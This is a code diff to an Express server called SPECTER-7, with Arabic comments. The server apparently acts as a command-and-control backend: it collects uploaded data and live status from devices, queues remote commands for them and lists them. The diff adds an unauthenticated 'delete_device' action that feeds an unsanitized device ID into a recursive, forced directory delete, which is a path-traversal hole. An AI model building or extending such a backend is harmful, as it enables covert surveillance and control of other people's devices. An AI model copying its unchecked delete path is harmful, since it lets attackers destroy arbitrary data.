@@ -23,9 +23,7 @@ if (!fs.existsSync(devicesFile)) {
     fs.writeFileSync(devicesFile, '[]');
 }
 
-// ============ API Routes ============
-
-// استقبال البيانات من التطبيق
+// ============ استقبال البيانات ============
 app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
@@ -59,7 +57,7 @@ app.post('/upload.php', (req, res) => {
     }
 });
 
-// استقبال الحالة الحية
+// ============ استقبال الحالة الحية ============
 app.post('/live_update.php', (req, res) => {
     try {
         const data = req.body;
@@ -91,7 +89,7 @@ app.post('/live_update.php', (req, res) => {
     }
 });
 
-// الحصول على البيانات الحية
+// ============ الحصول على البيانات الحية ============
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -141,13 +139,32 @@ app.get('/live.php', (req, res) => {
     }
 });
 
-// الحصول على بيانات محددة
+// ============ API Routes ============
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
         const deviceId = req.query.device;
         const type = req.query.type;
         
+        // حذف جهاز
+        if (action === 'delete_device') {
+            if (!deviceId) {
+                return res.json({ error: 'Device ID required' });
+            }
+            
+            const deviceDir = path.join(dataDir, deviceId);
+            if (fs.existsSync(deviceDir)) {
+                fs.rmSync(deviceDir, { recursive: true, force: true });
+            }
+            
+            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
+            devices = devices.filter(d => d.id !== deviceId);
+            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
+            
+            return res.json({ success: true });
+        }
+        
+        // الحصول على بيانات محددة
         if (action === 'get_data') {
             const dataFile = path.join(dataDir, deviceId, 'data.json');
             if (fs.existsSync(dataFile)) {
@@ -160,14 +177,18 @@ app.get('/api.php', (req, res) => {
             } else {
                 res.json([]);
             }
-        } else if (action === 'get_live') {
+        } 
+        // الحصول على الحالة الحية
+        else if (action === 'get_live') {
             const liveFile = path.join(dataDir, deviceId, 'live.json');
             if (fs.existsSync(liveFile)) {
                 res.json(JSON.parse(fs.readFileSync(liveFile, 'utf8')));
             } else {
                 res.json({});
             }
-        } else if (action === 'get_commands') {
+        } 
+        // الحصول على الأوامر
+        else if (action === 'get_commands') {
             const commandsFile = path.join(dataDir, deviceId, 'commands.json');
             if (fs.existsSync(commandsFile)) {
                 const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
@@ -176,7 +197,8 @@ app.get('/api.php', (req, res) => {
             } else {
                 res.json({ commands: [] });
             }
-        } else {
+        } 
+        else {
             res.json({ error: 'Invalid action' });
         }
     } catch (e) {
@@ -184,7 +206,7 @@ app.get('/api.php', (req, res) => {
     }
 });
 
-// إرسال أمر
+// ============ إرسال أمر ============
 app.post('/api.php', (req, res) => {
     try {
         const { device, command } = req.body;
@@ -218,7 +240,7 @@ app.post('/api.php', (req, res) => {
     }
 });
 
-// الحصول على قائمة الأجهزة
+// ============ قائمة الأجهزة ============
 app.get('/devices.json', (req, res) => {
     try {
         const devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
@@ -229,7 +251,6 @@ app.get('/devices.json', (req, res) => {
 });
 
 // ============ Helper Functions ============
-
 function updateDevicesList(deviceId) {
     let devices = [];
     if (fs.existsSync(devicesFile)) {
@@ -251,7 +272,6 @@ function updateDevicesList(deviceId) {
 }
 
 // ============ Start Server ============
-
 app.listen(PORT, () => {
     console.log(`SPECTER-7 Server running on port ${PORT}`);
 });
